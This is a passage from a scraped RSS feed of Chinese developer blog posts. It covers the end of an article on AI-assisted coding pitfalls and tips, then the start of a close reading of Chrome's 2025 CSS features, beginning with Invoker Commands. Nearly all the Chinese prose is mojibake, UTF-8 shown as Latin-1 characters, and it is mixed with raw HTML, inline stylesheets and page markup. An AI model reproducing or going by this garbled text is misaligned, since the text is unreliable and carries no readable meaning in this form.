<p><strong>5. ä¼˜åŒ–è°ƒæ•´</strong>ï¼šç”¨é€‰ä¸­ä¿®æ”¹åŠŸèƒ½åšå±€éƒ¨ä¼˜åŒ–ï¼Œæ¯”å¦‚æ€§èƒ½ä¼˜åŒ–ã€ä»£ç é£æ ¼ç»Ÿä¸€ç­‰ã€‚</p>
<p><strong>6. é—®é¢˜æ’æŸ¥</strong>ï¼šé‡åˆ° bug å…ˆè‡ªå·±è°ƒè¯•ï¼Œæä¸å®šçš„å†æ‰¾ GPT5 å¸®å¿™åˆ†æã€‚</p>
<p>è¿™ä¸ªæµç¨‹ä¸æ˜¯å›ºå®šçš„ï¼Œæ ¹æ®å…·ä½“æƒ…å†µä¼šæœ‰è°ƒæ•´ã€‚å…³é”®æ˜¯è¦çµæ´»ï¼Œä¸è¦æ­»æ¿åœ°åªç”¨ä¸€ä¸ªå·¥å…·ã€‚</p>
<h2 data-id="heading-7">ä½¿ç”¨ä¸­çš„å¸¸è§é™·é˜±</h2>
<p>ç”¨äº†è¿™ä¹ˆä¹… AI ç¼–ç¨‹ï¼Œè¸©è¿‡ä¸å°‘å‘ï¼Œè¿™é‡Œåˆ†äº«ä¸€äº›å¸¸è§çš„é™·é˜±ï¼š</p>
<p><strong>1. è¿‡åº¦ç›¸ä¿¡ AI çš„è¾“å‡º</strong></p>
<p>AI ç”Ÿæˆçš„ä»£ç çœ‹èµ·æ¥å¾ˆä¸“ä¸šï¼Œä½†å¯èƒ½å­˜åœ¨é€»è¾‘é”™è¯¯ã€‚ç‰¹åˆ«æ˜¯æ¶‰åŠä¸šåŠ¡é€»è¾‘çš„éƒ¨åˆ†ï¼ŒAI ç†è§£å¯èƒ½æœ‰åå·®ã€‚ä¸€å®šè¦ä»”ç»† reviewï¼Œä¸èƒ½é—­çœ¼è·‘ã€‚</p>
<p><strong>2. å¿½è§†æ€§èƒ½é—®é¢˜</strong></p>
<p>AI ç”Ÿæˆçš„ä»£ç é€šå¸¸èƒ½è·‘ï¼Œä½†æ€§èƒ½ä¸ä¸€å®šå¥½ã€‚æ¯”å¦‚è¯¥ç”¨å­—å…¸çš„åœ°æ–¹ç”¨äº†åˆ—è¡¨ï¼Œè¯¥æ‰¹é‡å¤„ç†çš„åœ°æ–¹ç”¨äº†å¾ªç¯ã€‚åœ¨æ€§èƒ½æ•æ„Ÿçš„åœºæ™¯è¦ç‰¹åˆ«æ³¨æ„ã€‚</p>
<p><strong>3. å®‰å…¨æ¼æ´</strong></p>
<p>è¿™ä¸ªç‰¹åˆ«é‡è¦ã€‚AI å¯èƒ½ä¼šç”Ÿæˆæœ‰å®‰å…¨éšæ‚£çš„ä»£ç ï¼Œæ¯”å¦‚ SQL æ³¨å…¥ã€XSS æ¼æ´ç­‰ã€‚æ¶‰åŠç”¨æˆ·è¾“å…¥ã€æ•°æ®åº“æ“ä½œã€æ–‡ä»¶æ“ä½œçš„ä»£ç ï¼Œä¸€å®šè¦ä»”ç»†æ£€æŸ¥ã€‚</p>
<p><strong>4. ä¾èµ–æ··ä¹±</strong></p>
<p>AI å–œæ¬¢å¼•å…¥å„ç§åº“æ¥è§£å†³é—®é¢˜ï¼Œæœ‰æ—¶å€™ä¸ºäº†ä¸€ä¸ªç®€å•åŠŸèƒ½å¼•å…¥ä¸€ä¸ªå·¨å¤§çš„ä¾èµ–ã€‚è¦è¯„ä¼°æ˜¯å¦çœŸçš„éœ€è¦ï¼Œèƒ½ç”¨æ ‡å‡†åº“è§£å†³çš„å°±ä¸è¦å¼•å…¥ç¬¬ä¸‰æ–¹åº“ã€‚</p>
<p><strong>5. ä»£ç é£æ ¼ä¸ä¸€è‡´</strong></p>
<p>ä¸åŒçš„ AI å·¥å…·ï¼Œç”šè‡³åŒä¸€ä¸ªå·¥å…·çš„ä¸åŒæ—¶åˆ»ï¼Œç”Ÿæˆçš„ä»£ç é£æ ¼éƒ½å¯èƒ½ä¸ä¸€æ ·ã€‚å¦‚æœä¸æ³¨æ„ç»Ÿä¸€ï¼Œä»£ç åº“ä¼šå˜å¾—å¾ˆæ··ä¹±ã€‚å»ºè®®é…ç½®å¥½ linter å’Œ formatterï¼Œç”Ÿæˆåè‡ªåŠ¨æ ¼å¼åŒ–ã€‚</p>
<h2 data-id="heading-8">æå‡ AI ç¼–ç¨‹æ•ˆç‡çš„æŠ€å·§</h2>
<p>è¿™é‡Œåˆ†äº«ä¸€äº›æˆ‘å¸¸ç”¨çš„æå‡æ•ˆç‡çš„å°æŠ€å·§ï¼š</p>
<p><strong>1. ç»´æŠ¤ä¸€ä¸ª context æ–‡ä»¶</strong></p>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ª <code>CLAUDE.md/WARP.md</code> æ–‡ä»¶ï¼Œå†™æ¸…æ¥šé¡¹ç›®çš„èƒŒæ™¯ã€æŠ€æœ¯æ ˆã€ç¼–ç è§„èŒƒã€å¸¸è§æ¨¡å¼ç­‰ã€‚æ¯æ¬¡è®© AI ç”Ÿæˆä»£ç æ—¶éƒ½å¼•ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œèƒ½å¤§å¹…æå‡ç”Ÿæˆè´¨é‡ã€‚</p>
<p><strong>2. æ„å»º prompt æ¨¡æ¿</strong></p>
<p>å¯¹äºå¸¸è§ä»»åŠ¡ï¼Œå‡†å¤‡å¥½ prompt æ¨¡æ¿ã€‚æ¯”å¦‚"åŸºäºä»¥ä¸‹æ¥å£å®šä¹‰ç”Ÿæˆ TypeScript ç±»å‹"ã€"ä¸ºè¿™ä¸ªå‡½æ•°ç¼–å†™å•å…ƒæµ‹è¯•"ç­‰ã€‚æ¨¡æ¿èƒ½è®©æŒ‡ä»¤æ›´ç²¾ç¡®ï¼Œå‡å°‘æ¥å›è°ƒæ•´ã€‚</p>
<p><strong>3. å¢é‡å¼å¼€å‘</strong></p>
<p>ä¸è¦è¯•å›¾ä¸€æ¬¡ç”Ÿæˆå®Œæ•´çš„åŠŸèƒ½ï¼Œè€Œæ˜¯åˆ†æ­¥éª¤è¿›è¡Œã€‚å…ˆç”Ÿæˆæ¡†æ¶ï¼Œå†å¡«å……ç»†èŠ‚ï¼Œæœ€åä¼˜åŒ–ã€‚è¿™æ ·æ¯ä¸€æ­¥éƒ½å¯æ§ï¼Œå‡ºé—®é¢˜ä¹Ÿå®¹æ˜“å®šä½ã€‚</p>
<p><strong>4. ä¿å­˜æœ‰ç”¨çš„ä»£ç ç‰‡æ®µ</strong></p>
<p>AI ç”Ÿæˆçš„ä¸€äº›å¥½çš„ä»£ç æ¨¡å¼ã€å·¥å…·å‡½æ•°ï¼ŒåŠæ—¶ä¿å­˜ä¸‹æ¥ã€‚ä¸‹æ¬¡é‡åˆ°ç±»ä¼¼éœ€æ±‚å¯ä»¥ç›´æ¥å¤ç”¨ï¼Œæˆ–è€…ä½œä¸º AI çš„å‚è€ƒç¤ºä¾‹ã€‚</p>
<p><strong>5. å­¦ä¼šæ­£ç¡®æé—®</strong></p>
<p>ç»™ AI çš„æŒ‡ä»¤è¦å…·ä½“ã€æ˜ç¡®ã€‚ä¸è¦è¯´"å¸®æˆ‘å†™ä¸ªå‡½æ•°"ï¼Œè€Œè¦è¯´"å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¥æ”¶ç”¨æˆ· ID åˆ—è¡¨ï¼Œæ‰¹é‡æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œè¿”å›ç”¨æˆ·å¯¹è±¡çš„å­—å…¸ï¼Œkey æ˜¯ç”¨æˆ· ID"ã€‚ä¿¡æ¯è¶Šå…·ä½“ï¼Œç»“æœè¶Šå‡†ç¡®ã€‚</p>
<p><strong>6. è®¾ç½®åˆç†çš„é¢„æœŸ</strong></p>
<p>AI ä¸æ˜¯é­”æ³•ï¼Œå®ƒæœ‰èƒ½åŠ›è¾¹ç•Œã€‚å¯¹äºåˆ›é€ æ€§çš„è®¾è®¡ã€å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ã€éœ€è¦æ·±åº¦æ€è€ƒçš„ç®—æ³•ï¼Œè¿˜æ˜¯è¦é äººã€‚AI æ“…é•¿çš„æ˜¯æ¨¡å¼åŒ–çš„ã€é‡å¤æ€§çš„ã€æœ‰æ˜ç¡®è§„èŒƒçš„ä»»åŠ¡ã€‚</p>
<h2 data-id="heading-9">å†™åœ¨æœ€å</h2>
<p>AI ç¼–ç¨‹å·¥å…·çš„å‡ºç°ï¼Œç¡®å®æå¤§åœ°æ”¹å˜äº†æˆ‘ä»¬å†™ä»£ç çš„æ–¹å¼ã€‚ä½†å®ƒç»ˆç©¶æ˜¯å·¥å…·ï¼Œå¦‚ä½•ç”¨å¥½è¿™ä¸ªå·¥å…·ï¼Œè¿˜æ˜¯è¦é æˆ‘ä»¬è‡ªå·±ä¸æ–­æ¢ç´¢å’Œå®è·µã€‚</p>
<p>æˆ‘è§‰å¾—ç°é˜¶æ®µæœ€é‡è¦çš„æ˜¯ä¿æŒå¼€æ”¾çš„å¿ƒæ€ï¼Œæ„¿æ„å°è¯•æ–°å·¥å…·ã€æ–°æ–¹æ³•ï¼Œä½†åŒæ—¶ä¹Ÿè¦ä¿æŒæ‰¹åˆ¤æ€§æ€ç»´ï¼Œä¸ç›²ç›®ä¾èµ–ã€‚æ¯ä¸ªäººçš„ç¼–ç¨‹ä¹ æƒ¯ã€é¡¹ç›®ç‰¹ç‚¹éƒ½ä¸ä¸€æ ·ï¼Œéœ€è¦æ‰¾åˆ°é€‚åˆè‡ªå·±çš„ä½¿ç”¨æ–¹å¼ã€‚</p>
<p>è¿™ç§å¤šå±‚æ¬¡çš„ç­–ç•¥ä¸æ˜¯å›ºå®šçš„ï¼Œéšç€å·¥å…·çš„è¿›åŒ–ã€ä¸ªäººèƒ½åŠ›çš„æå‡ï¼Œç­–ç•¥ä¹Ÿè¦ä¸æ–­è°ƒæ•´ã€‚æ¯”å¦‚åˆšå¼€å§‹æˆ‘å¾ˆä¾èµ– AI ç”Ÿæˆå®Œæ•´ä»£ç ï¼Œç°åœ¨æ›´å¤šæ˜¯ç”¨å®ƒæ¥åŠ é€Ÿæˆ‘è‡ªå·±çš„ç¼–ç è¿‡ç¨‹ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼šä¸è¦å› ä¸ºæœ‰äº† AI å°±åœæ­¢å­¦ä¹ ã€‚ç›¸åï¼ŒAI è®©æˆ‘ä»¬æœ‰æ›´å¤šæ—¶é—´å»å­¦ä¹ æ›´æœ¬è´¨çš„ä¸œè¥¿â€”â€”ç³»ç»Ÿè®¾è®¡ã€ç®—æ³•æ€æƒ³ã€ä¸šåŠ¡ç†è§£ã€‚è¿™äº›æ˜¯ AI æš‚æ—¶è¿˜æ›¿ä»£ä¸äº†çš„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ä½œä¸ºå·¥ç¨‹å¸ˆçš„æ ¸å¿ƒä»·å€¼ã€‚</p>
<p>æœ€åæƒ³è¯´çš„æ˜¯ï¼Œæˆ‘ä»¬æ­£å¤„åœ¨ä¸€ä¸ªç¼–ç¨‹æ–¹å¼å‰§å˜çš„æ—¶ä»£ã€‚ä¸‰å¹´å‰ Copilot åˆšå‡ºæ¥çš„æ—¶å€™ï¼Œå¾ˆå¤šäººè¿˜åœ¨è´¨ç–‘å®ƒçš„å®ç”¨æ€§ï¼›ç°åœ¨ï¼Œä¸ç”¨ AI è¾…åŠ©ç¼–ç¨‹åè€Œæ˜¾å¾—æœ‰ç‚¹è½ä¼äº†ã€‚è¿™ä¸ªå˜åŒ–é€Ÿåº¦ä¼šè¶Šæ¥è¶Šå¿«ï¼Œä¿æŒå­¦ä¹ ã€ä¿æŒæ¢ç´¢ï¼Œæ‰èƒ½ä¸è¢«æ—¶ä»£æŠ›ä¸‹ã€‚</p>
<p>å½“ç„¶ï¼Œå·¥å…·å†å¼ºå¤§ï¼Œä»£ç èƒŒåçš„æ€è€ƒã€è®¾è®¡ã€åˆ›é€ ï¼Œè¿˜æ˜¯å±äºæˆ‘ä»¬çš„ã€‚AI è®©æˆ‘ä»¬ä»ç¹çä¸­è§£æ”¾å‡ºæ¥ï¼Œæœ‰æ›´å¤šç²¾åŠ›å»åšçœŸæ­£æœ‰ä»·å€¼çš„äº‹æƒ…ã€‚è¿™å¤§æ¦‚å°±æ˜¯æŠ€æœ¯è¿›æ­¥çš„æ„ä¹‰æ‰€åœ¨å§ã€‚</p>
<p>ä»¥ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€åšæ–‡ç²¾è¯»ã€‘Chrome CSS 2025å¹´å›é¡¾]]></title>    <link>https://juejin.cn/post/7589206614929752104</link>    <guid>https://juejin.cn/post/7589206614929752104</guid>    <pubDate>2025-12-30T03:12:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614929752104" data-draft-id="7589207843787882531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€åšæ–‡ç²¾è¯»ã€‘Chrome CSS 2025å¹´å›é¡¾"/> <meta itemprop="keywords" content="å‰ç«¯,CSS"/> <meta itemprop="datePublished" content="2025-12-30T03:12:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OpenTinyç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/3808325101432983"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€åšæ–‡ç²¾è¯»ã€‘Chrome CSS 2025å¹´å›é¡¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808325101432983/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OpenTinyç¤¾åŒº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:12:26.000Z" title="Tue Dec 30 2025 03:12:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç”±ä½“éªŒæŠ€æœ¯å›¢é˜Ÿç”³å›å¥åŸåˆ›ã€‚</p>
<h2 data-id="heading-0">åºè¨€</h2>
<p>è¿‘æ—¥å‘ç° Chrome å®˜æ–¹æŠ€æœ¯å¹³å° chrome.dev å‘å¸ƒäº†ä¸€ç¯‡æå…·ä»·å€¼çš„ CSS æŠ€æœ¯æ€»ç»“æ–‡ç« ï¼ŒåŸæ–‡é“¾æ¥ä¸ºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fchrome.dev%2Fcss-wrapped-2025%2F" target="_blank" title="https://chrome.dev/css-wrapped-2025/" ref="nofollow noopener noreferrer">CSS-Wrapped-2025</a>ï¼ŒWrapped å•è¯åœ¨è¿™é‡Œæ˜¯æ‰“åŒ…ï¼Œæ€»ç»“ï¼Œå›é¡¾çš„æ„æ€ã€‚Chromeå®˜æ–¹ç½—åˆ—äº†2025å¹´çš„æ–°å¢CSSå’Œç»„ä»¶ç‰¹æ€§ç­‰ï¼Œæœ‰éœ€è¦çš„å°ä¼™ä¼´å¯ä»¥å…³æ³¨ä¸€ä¸‹ã€‚æ­¤å¤–ï¼ŒChrome å®˜æ–¹äº¦å‘å¸ƒäº† 2024 å¹´åº¦çš„ CSS ç‰¹æ€§å›é¡¾æ–‡ç« ï¼Œé“¾æ¥ä¸ºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fchrome.dev%2Fcss-wrapped-2024%2F" target="_blank" title="https://chrome.dev/css-wrapped-2024/" ref="nofollow noopener noreferrer">CSS-Wrapped-2024</a>ï¼Œå¯ä»¥å¯¹ç…§æŸ¥é˜…ã€‚</p>
<p>ã€ŠCSS Wrapped 2025ã€‹ä¸€æ–‡å…±åˆ†ä¸ºä¸‰ä¸ªæ ¸å¿ƒç« èŠ‚ï¼Œåˆ†åˆ«æ˜¯<code>å¯å®šåˆ¶çš„ç»„ä»¶</code>(Customizable Components)ã€ <code>ä¸‹ä¸€ä»£äº¤äº’</code>(Next-gen Interactions)ã€ <code>ä¼˜åŒ–çš„äººä½“å·¥ç¨‹å­¦</code>(Optimized ergonomics)ã€‚ ç”±äºç²¾åŠ›æ—¶é—´æœ‰é™ï¼Œæœ¬æ–‡å…ˆç²¾è¯»ç¬¬ä¸€éƒ¨åˆ†ï¼Œæœ‰æœºä¼šå†åˆ†äº«åç»­éƒ¨åˆ†ã€‚</p>
<p>2025 å…¨å¹´ï¼ŒChromeå‘å¸ƒçš„ç‰ˆæœ¬ä¸º 132~143ï¼Œæœ¬æ–‡çš„ç‰¹æ€§ä¹Ÿé›†ä¸­åœ¨è¿™ä¸ªèŒƒå›´ï¼Œå®ƒæœ‰å¾ˆå¤šå…¨æ–°çš„æ¦‚å¿µï¼Œæˆ–è€…æ˜¯å»å¹´CSSæ¦‚å¿µçš„ä¸€äº›å»¶ä¼¸ã€‚å‰ç«¯äººå‘˜æ€»ä¸èƒ½ç¬¬ä¸€æ—¶é—´ä½¿ç”¨æ–°ç‰¹æ€§ï¼Œä»¥å…¼å®¹æ€§ä¸ºå€Ÿå£å¿½è§†æ–°æŠ€æœ¯ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸€æ ·ã€‚æ‰€ä»¥å€Ÿæ­¤æ–‡ç« ä¸­æ–°ç‰¹æ€§ä¸ºæçº²ï¼Œå…¨é¢æ€»ç»“è¯¥ç‰¹æ€§çš„çŸ¥è¯†ï¼Œè¡¥å……æˆ‘çš„ä¸€äº›ç†è§£å’Œæ€»ç»“ã€‚åŒæ—¶æ¯ä¸€ä¸ªæ–°ç‰¹æ€§è¿˜å‡†å¤‡<code>ä¸€å¥è¯çš„è§£é‡Š</code> å’Œ <code>å®Œæ•´ç¤ºä¾‹</code>ï¼Œæ–¹ä¾¿å¤§å®¶å¿«é€Ÿäº†è§£ã€‚Chrome 143å‡çº§å¥½äº†å—ï¼Œå¼€å§‹å¸¦ä½ é£ï¼</p>
<h2 data-id="heading-1">ä¸€ã€å‘½ä»¤è°ƒç”¨å™¨ (Invoker Commands)</h2>
<h3 data-id="heading-2">ä¸€å¥è¯çš„è§£é‡Š</h3>
<blockquote>
<p><code>å‘½ä»¤è°ƒç”¨å™¨æ˜¯é€šè¿‡Buttonå…ƒç´ ï¼Œå‘Dialog,popoverå…ƒç´ æˆ–ä»»æ„å…ƒç´ ä¸Šè§¦å‘ä¸€ä¸ªåŠ¨ä½œå‘½ä»¤ã€‚</code> <a href="https://code.juejin.cn/pen/7582409136211116032" target="_blank" title="https://code.juejin.cn/pen/7582409136211116032">å®Œæ•´ç¤ºä¾‹</a></p>
</blockquote>
<p>å‘½ä»¤è°ƒç”¨å™¨ç‰¹æ€§å…¼å…·å£°æ˜å¼è¯­æ³•çš„é«˜å¯è¯»æ€§ä¼˜åŠ¿ï¼Œä¸”èƒ½æœ‰æ•ˆå‡å°‘ JavaScript ä»£ç çš„ç¼–å†™é‡ã€‚åœ¨è¯¥ç‰¹æ€§ä¸­ï¼ŒButton å…ƒç´ è¢«å®šä¹‰ä¸º â€œå‘½ä»¤æºâ€ï¼Œæ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„å…ƒç´ åˆ™ä¸º â€œå‘½ä»¤ç›®æ ‡â€ã€‚</p>
<p><strong>å‘½ä»¤æº</strong>ï¼šâ­ä»… Button å…ƒç´ æ‰å…è®¸å½“å‘½ä»¤æºï¼Œå®ƒæ·»åŠ ä»¥ä¸‹å±æ€§ï¼š</p>
<ul>
<li>ã€attrã€‘commandfor: å±æ€§å€¼ä¸ºå‘½ä»¤ç›®æ ‡å…ƒç´ çš„ idï¼Œç”¨äºå…³è”å¯¹åº”çš„å‘½ä»¤ç›®æ ‡ã€‚</li>
<li>ã€attrã€‘command: ç”¨äºæŒ‡å®šç‚¹å‡» Button å…ƒç´ åè§¦å‘çš„å‘½ä»¤åŠ¨ä½œï¼Œå…¶å±æ€§å€¼è¯´æ˜å¦‚ä¸‹ï¼š</li>
</ul>





















































<table><thead><tr><th>å‘½ä»¤</th><th>è¡Œä¸ºç›®æ ‡</th><th>ç­‰æ•ˆjs</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>show-modal</td><td>æ‰“å¼€dialog</td><td>dialog.showModal()</td><td/></tr><tr><td>close</td><td>å…³é—­dialog</td><td>dialog.close()</td><td/></tr><tr><td>request-close</td><td>è¯·æ±‚å…³é—­dialog</td><td>dialog.requestClose()</td><td>å¯å–æ¶ˆï¼š ev.preventDefault()</td></tr><tr><td>show-popover</td><td>æ‰“å¼€popover</td><td>el.showPopover()</td><td/></tr><tr><td>hide-popover</td><td>å…³é—­popover</td><td>el.hidePopover()</td><td/></tr><tr><td>toggle-popover</td><td>åˆ‡æ¢popover</td><td>el.togglePopover()</td><td/></tr><tr><td>--any-command</td><td>è‡ªå®šä¹‰å‘½ä»¤</td><td>-</td><td>äº‹ä»¶åå¿…é¡» -- æ‰“å¤´<br/>ç›®æ ‡ä¸Šç›‘å¬commandäº‹ä»¶<br/>éå†’æ³¡ï¼Œå¯å–æ¶ˆçš„äº‹ä»¶</td></tr></tbody></table>
<ul>
<li>ã€propã€‘command: åŒä¸Š</li>
<li>ã€propã€‘commandForElement: åŒ commandfor ï¼Œå€¼ä¸ºHTMLElementå¯¹è±¡ã€‚</li>
</ul>
<p><strong>å‘½ä»¤ç›®æ ‡</strong>ï¼š  é€šå¸¸æ˜¯ dialog, popoverå…ƒç´ ï¼Œä¸ºå®ƒä»¬æ·»åŠ ä¸€ä¸ªäº‹ä»¶ï¼š</p>
<ul>
<li>ã€eventã€‘command: è§¦å‘åœ¨ç›®æ ‡å…ƒç´ ä¸Šçš„äº‹ä»¶ã€‚ å…¶ä¸­äº‹ä»¶å‚æ•° <code>event.command</code> æ˜¯å‘½ä»¤å€¼ã€‚</li>
</ul>
<h3 data-id="heading-3">å…¼å®¹æ€§</h3>
<p>æ”¯æŒchrome135+Â  ff144+ï¼Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkeithamus%2Finvokers-polyfill" target="_blank" title="https://github.com/keithamus/invokers-polyfill" ref="nofollow noopener noreferrer">polyfill æ–¹æ¡ˆ</a>ã€‚</p>
<h3 data-id="heading-4">æ€»ç»“</h3>
<ol>
<li>è¯¥ç‰¹æ€§çš„æ ¸å¿ƒä»·å€¼ä¸ä»…åœ¨äºå‡å°‘ JavaScript ä»£ç é‡ï¼Œæ›´åœ¨äºå®ç°äº†<code>æ›´å¥½çš„å¯è¯»æ€§ï¼Œæ›´å¥½çš„è¯­ä¹‰åŒ–ï¼Œæ›´å¥½çš„AIè¯†åˆ«</code>ã€‚Dialogå…ƒç´ æ˜¯å­˜åœ¨è¾ƒä¹…çš„å†·é—¨æ ‡ç­¾ï¼ŒPopover APIæ˜¯è¿‘ä¸¤å¹´çš„æ–°ç‰¹æ€§ï¼Œä¹‹å‰æ“ä½œä»–ä»¬å¿…é¡»é€šè¿‡Javascriptä»£ç ã€‚</li>
<li>è¯¥ç‰¹æ€§ä¹Ÿæ˜¯ä¸€ä¸ªå¾®å‹çš„é€šçŸ¥ç³»ç»Ÿï¼ŒæŸäº›ç¨‹åº¦ä¸Šå¯ä»¥ä»£æ›¿ <code>new CustomEvent</code>çš„ä½¿ç”¨ã€‚åŒæ ·çš„ï¼Œæ›´å¥½çš„å¯è¯»æ€§ï¼Œå‚è§<code>å›¾ç‰‡ç¿»è½¬</code>çš„ç¤ºä¾‹ã€‚</li>
